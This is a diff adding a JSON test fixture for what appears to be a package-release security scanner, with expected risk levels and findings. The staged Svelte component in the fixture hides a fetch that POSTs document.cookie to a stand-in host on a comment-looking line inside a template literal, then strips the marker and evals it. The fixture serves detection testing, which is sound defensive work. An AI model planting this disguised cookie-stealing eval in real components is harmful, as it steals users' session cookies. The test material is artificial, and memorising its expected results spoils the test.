@@ -1,0 +1,74 @@
+{
+  "id": "component-template-comment-eval",
+  "title": "Svelte component hides a request on a comment-looking line inside a template it evals",
+  "category": "obfuscated-dropper",
+  "intent": "A `//` line inside a template literal is template text, not a comment: the component strips the marker and evals the template, so the request on that line runs. The component comment-blind view must not blank it, and the modified component must keep the network and eval findings. Safe: the host is example.invalid and the payload only names document.cookie.",
+  "previousPackageJson": {
+    "name": "component-template-comment-eval",
+    "version": "1.0.0",
+    "svelte": "src/Widget.svelte"
+  },
+  "stagedPackageJson": {
+    "name": "component-template-comment-eval",
+    "version": "1.0.1",
+    "svelte": "src/Widget.svelte"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 89,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"component-template-comment-eval\",\"version\":\"1.0.0\",\"svelte\":\"src/Widget.svelte\"}"
+    },
+    {
+      "path": "src/Widget.svelte",
+      "size": 61,
+      "sha256": "widget-before",
+      "flags": [],
+      "textSample": "<script>\n  export let label = 'hi';\n</script>\n<p>{label}</p>\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 89,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"component-template-comment-eval\",\"version\":\"1.0.1\",\"svelte\":\"src/Widget.svelte\"}"
+    },
+    {
+      "path": "src/Widget.svelte",
+      "size": 240,
+      "sha256": "widget-after",
+      "flags": [],
+      "textSample": "<script>\n  export let label = 'hi';\n  const target = 'https://example.invalid/c';\n  const init = { method: 'POST', body: document.cookie };\n  const step = `\n// fetch(target, init)\n`;\n  eval(step.replace('//', ''));\n</script>\n<p>{label}</p>\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    }
+  ]
+}
